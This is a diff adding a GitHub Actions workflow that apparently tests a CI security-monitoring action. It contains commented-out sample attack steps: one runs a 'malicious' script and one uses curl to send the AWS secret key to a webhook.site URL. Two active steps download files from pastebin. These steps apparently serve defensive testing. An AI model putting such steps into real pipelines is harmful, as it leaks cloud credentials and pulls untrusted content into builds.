@@ -1,0 +1,66 @@
+name: Python Project (short workflow STAGE BASELINE)
+
+on:
+  workflow_dispatch:
+
+permissions:
+  checks: write
+  contents: write
+  packages: read
+  actions: read
+
+jobs:
+  python-application-build:
+    runs-on: ubuntu-latest
+    name: Run build
+    steps:
+      
+      - name: Setup PSE
+        uses: invisirisk/pse-action@test
+        with:
+          api_url: "https://app.dev.invisirisk.com"
+          app_token: ${{ secrets.IR_TEST_DEV }}
+          
+      - uses: actions/checkout@v4
+
+      - name: Use Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: "3.13"
+        
+      - name: Install dependencies
+        run: pip install -r requirements.txt
+
+      # - name: 😈 Execute malicious script
+      #   run: bash run_malicious_scripts.sh
+
+      # - name: Send AWS Secret via Webhook (test)
+      #   run: |
+      #    curl -X POST "https://webhook.site/59c8292c-2297-4149-ac29-c02bec44a27a" \
+      #      --data-urlencode "aws_secret_access_key=${{ secrets.AWS_SECRET_ACCESS_KEY }}"
+      - name: Secrets on response
+        run: |
+          curl -L -o abc.txt https://pastebin.com/raw/1Qp73vAy
+      - name: Secrets on response m2
+        run: |
+          curl -L -o bcd.txt https://pastebin.com/dl/1Qp73vAy
+          
+      - name: Cleanup PSE
+        if: always()
+        uses: invisirisk/pse-action@test
+        with:
+          cleanup: "true"
+          debug: "true"
+          
+  gather_analytics:
+    runs-on: ubuntu-latest
+    name: Gather Analytics
+    needs: python-application-build
+    steps:
+      - name: Gather Status
+        uses: invisirisk/pse-action@test
+        with:
+          api_url: "https://app.dev.invisirisk.com"
+          app_token: ${{ secrets.IR_TEST_DEV }}
+          send_job_status: "true"
+          "debug": "true"
